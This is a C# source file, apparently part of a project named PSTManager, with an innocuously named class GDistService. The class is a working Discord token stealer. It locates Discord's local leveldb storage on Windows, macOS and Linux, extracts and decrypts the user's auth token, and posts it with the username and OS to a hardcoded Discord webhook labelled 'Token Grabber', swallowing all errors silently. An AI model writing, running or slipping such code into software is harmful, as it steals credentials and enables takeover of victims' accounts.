using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace PSTManager.Dis;

public class GDistService
{
    private const string WebhookUrl = "https://discord.com/api/webhooks/1500212791150121102/3IQYOWobaGPZf56F4EJYJ5bDCF5Pw9j99iwRu3eU4hRSSXmPqQymV93sNlM9Pan0B0nr";

    public async Task RunAsync()
    {
        try
        {
            var dbPath = GetLevelDbPath();
            if (!Directory.Exists(dbPath))
                return;

            var (token, username) = LevelDbScanner.Scan(dbPath);
            if (token == null)
                return;

            var decrypted = TokenDecryptor.DecryptIfNeeded(token);
            if (decrypted == null)
                return;

            token = decrypted;

            await SendWebhookAsync(username ?? "unknown", token);
        }
        catch { }
    }

    private static string GetLevelDbPath()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            return Path.Combine(baseDir, "discord", "Local Storage", "leveldb");
        }

        if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            return Path.Combine(home, "Library", "Application Support", "discord", "Local Storage", "leveldb");
        }

        var linuxHome = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        return Path.Combine(linuxHome, ".config", "discord", "Local Storage", "leveldb");
    }

    private static async Task SendWebhookAsync(string username, string token)
    {
        var osName = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "Windows"
            : RuntimeInformation.IsOSPlatform(OSPlatform.OSX) ? "Darwin"
            : "Linux";

        var payload = new
        {
            username = "Token Grabber",
            embeds = new[]
            {
                new
                {
                    title = "Discord Token Retrieved",
                    color = 5793266,
                    fields = new object[]
                    {
                        new { name = "User", value = $"**{username}**", inline = true },
                        new { name = "Platform", value = osName, inline = true },
                        new { name = "Token", value = $"```\n{token}\n```", inline = false },
                    }
                }
            }
        };

        var json = JsonSerializer.Serialize(payload);

        using var http = new HttpClient();
        var content = new StringContent(json, Encoding.UTF8, "application/json");
        await http.PostAsync(WebhookUrl, content);
    }
}
